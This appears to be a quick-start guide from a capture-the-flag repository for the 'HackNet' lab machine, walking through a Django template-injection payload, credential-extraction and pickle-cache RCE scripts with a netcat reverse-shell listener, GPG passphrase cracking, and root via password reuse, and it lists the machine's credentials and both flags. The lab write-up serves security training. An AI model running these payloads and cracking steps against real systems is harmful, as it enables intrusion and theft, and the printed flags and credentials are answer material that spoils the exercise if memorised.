# HackNet - Quick Start Guide

## 🚀 TL;DR - Get User Flag in 5 Minutes

```bash
# 1. Add to hosts
echo "10.129.232.4 hacknet.htb" | sudo tee -a /etc/hosts

# 2. Register account at http://hacknet.htb/register
# Email: hack@hacker.com, Username: hacker, Password: hacker

# 3. Change your username to: {{ users.values }}
# (Go to profile edit page)

# 4. Extract credentials
python3 extract_credentials.py

# 5. Test SSH access
python3 test_ssh_credentials.py

# 6. SSH and get flag
ssh mikey@10.129.232.4
# Password: mYd4rks1dEisH3re
cat ~/user.txt
```

**User Flag:** `b2e0413c7f9daf1f3008edc3c0d1ffdd`

---

## 🏆 TL;DR - Get Root Flag in 15 Minutes

```bash
# 7. Django cache RCE
scp django_rce.py mikey@10.129.232.4:/tmp/
ssh mikey@10.129.232.4 "python3 /tmp/django_rce.py"

# 8. Copy GPG key
scp mikey@10.129.232.4:/tmp/armored_key.asc .

# 9. Crack GPG passphrase
gpg2john armored_key.asc > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Result: sweetheart

# 10. Decrypt backup
echo "sweetheart" | gpg --batch --yes --passphrase-fd 0 --import armored_key.asc
echo "sweetheart" | gpg --batch --yes --passphrase-fd 0 --decrypt backup02.sql.gpg > backup.sql
grep -i "password" backup.sql | grep "h4ck"
# Find: h4ck3rs4re3veRywh3re99

# 11. Become root
ssh mikey@10.129.232.4
su -
# Password: h4ck3rs4re3veRywh3re99
cat /root/root.txt
```

**Root Flag:** `132d03b6361e83f2b6e0670ec88ad1b4`

---

## 📚 Full Documentation

- **[WALKTHROUGH.md](./WALKTHROUGH.md)** - Complete step-by-step guide (47KB)
- **[README.md](./README.md)** - Repository overview and reference (13KB)
- **[DOCUMENTATION_SUMMARY.md](./DOCUMENTATION_SUMMARY.md)** - Documentation overview (8KB)

---

## 🛠️ Prerequisites

### Install Required Tools
```bash
# Python packages
pip3 install requests beautifulsoup4 paramiko

# System tools (should already be installed)
sudo apt update
sudo apt install nmap ffuf john gpg curl
```

### Get Your Session Cookies

1. Visit `http://hacknet.htb` and login
2. Press F12 → Application → Cookies
3. Copy `csrftoken` and `sessionid`
4. Update scripts:

```python
# In extract_credentials.py and django_rce.py
CSRF_TOKEN = "YOUR_CSRF_TOKEN_HERE"
SESSION_ID = "YOUR_SESSION_ID_HERE"
```

---

## 📊 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                     Initial Access                           │
├─────────────────────────────────────────────────────────────┤
│ 1. Nmap Scan          → Found SSH (22) and HTTP (80)        │
│ 2. Web Enumeration    → Django social network app           │
│ 3. SSTI Discovery     → Username field vulnerable           │
│ 4. Credential Extract → 26 user credentials leaked          │
│ 5. SSH Access         → mikey:mYd4rks1dEisH3re              │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                  Privilege Escalation                        │
├─────────────────────────────────────────────────────────────┤
│ 6. Django Config      → Found cache at /var/tmp/            │
│ 7. Pickle RCE         → Code execution as www-data          │
│ 8. GPG Key Extract    → Sandy's private key copied          │
│ 9. Passphrase Crack   → "sweetheart" (3 seconds)            │
│ 10. Backup Decrypt    → MySQL root password found           │
│ 11. Root Access       → Password reused for system root     │
└─────────────────────────────────────────────────────────────┘
```

---

## 🎯 Key Vulnerabilities

| # | Vulnerability | Severity | Impact |
|---|---------------|----------|--------|
| 1 | Django SSTI | High (8.6) | Information Disclosure |
| 2 | Pickle Deserialization | Critical (9.8) | Remote Code Execution |
| 3 | Weak GPG Passphrase | Medium (6.5) | Data Decryption |
| 4 | Password Reuse | High (7.5) | Privilege Escalation |

---

## 🔑 Credentials Quick Reference

```
Web Account:
  Email: hack@hacker.com
  Password: hacker

SSH Access (User):
  Username: mikey
  Password: mYd4rks1dEisH3re

MySQL Database:
  Username: sandy
  Password: h@ckn3tDBpa$$

GPG Private Key:
  Passphrase: sweetheart

System Root:
  Username: root
  Password: h4ck3rs4re3veRywh3re99
```

---

## ⚡ Scripts Usage

### 1. Extract Credentials (SSTI)
```bash
python3 extract_credentials.py
# Output: credentials.json, credentials.txt
```

### 2. Test SSH Access
```bash
python3 test_ssh_credentials.py
# Output: ssh_valid_credentials.txt
```

### 3. Django Cache RCE
```bash
# Update LHOST in django_rce.py to your IP
# Transfer to target
scp django_rce.py mikey@10.129.232.4:/tmp/

# Run on target
ssh mikey@10.129.232.4 "python3 /tmp/django_rce.py"

# Start listener
nc -lvnp 4444

# Trigger RCE
curl http://hacknet.htb/explore
```

---

## 🐛 Troubleshooting

### "No credentials extracted"
**Solution:** Make sure your username is exactly `{{ users.values }}` with spaces

### "No cache files found"
**Solution:** Visit /explore first to generate cache files:
```bash
curl http://hacknet.htb/explore -H "Cookie: csrftoken=YOUR_TOKEN; sessionid=YOUR_SESSION"
```

### "GPG import hangs"
**Solution:** Use batch mode:
```bash
echo "sweetheart" | gpg --batch --yes --passphrase-fd 0 --import armored_key.asc
```

### "Reverse shell not connecting"
**Solution:** 
1. Check VPN IP: `ip a show tun0`
2. Check firewall: `sudo ufw allow 4444/tcp`
3. Re-run exploit and trigger again

---

## 📖 Where to Start

### **Complete Beginner?**
→ Read [WALKTHROUGH.md](./WALKTHROUGH.md) from start to finish

### **Intermediate User?**
→ Use this Quick Start + refer to [WALKTHROUGH.md](./WALKTHROUGH.md) as needed

### **Advanced User?**
→ Use this Quick Start + [README.md](./README.md) for vulnerability details

### **Want to Learn the Code?**
→ Check the scripts/ directory with inline comments

---

## 🎓 Learning Objectives

After completing this machine, you will understand:

✅ Django Server-Side Template Injection (SSTI)
✅ Python Pickle Deserialization attacks
✅ GPG key cracking with John the Ripper
✅ Multi-stage privilege escalation chains
✅ Automation with Python scripts
✅ Secure coding practices for Django

---

## 🏁 Success Criteria

- [ ] Understand how SSTI works
- [ ] Successfully extract all 26 credentials
- [ ] Gain SSH access as mikey
- [ ] Capture user flag
- [ ] Execute Django cache RCE
- [ ] Extract and crack GPG key
- [ ] Decrypt database backup
- [ ] Escalate to root
- [ ] Capture root flag
- [ ] Understand all vulnerabilities
- [ ] Know how to prevent each vulnerability

---

## 📞 Need Help?

1. **Read the Troubleshooting section** in [WALKTHROUGH.md](./WALKTHROUGH.md)
2. **Check script output** for error messages
3. **Verify prerequisites** are installed
4. **Double-check configuration** (IP, cookies, paths)
5. **Read vulnerability explanations** to understand the theory

---

## 🎉 Congratulations!

Once you capture both flags, you've successfully:
- Exploited a real-world web application vulnerability
- Performed remote code execution via deserialization
- Cracked encryption and decrypted sensitive data
- Chained multiple vulnerabilities for privilege escalation
- Learned valuable penetration testing skills

**Well done! 🏆**

---

## ⏱️ Time Estimates

- **First Time:** 2-3 hours (reading + executing)
- **With Guide:** 30-45 minutes
- **Speed Run:** 15-20 minutes
- **Auto-Pwn:** 5 minutes (with scripts)

---

## 🔗 Quick Links

- [Complete Walkthrough](./WALKTHROUGH.md)
- [Repository Overview](./README.md)
- [Documentation Summary](./DOCUMENTATION_SUMMARY.md)
- Scripts Directory: `./scripts/`
- Outputs Directory: `./outputs/`

---

**Happy Hacking! 🚀**

*Last Updated: December 2025*
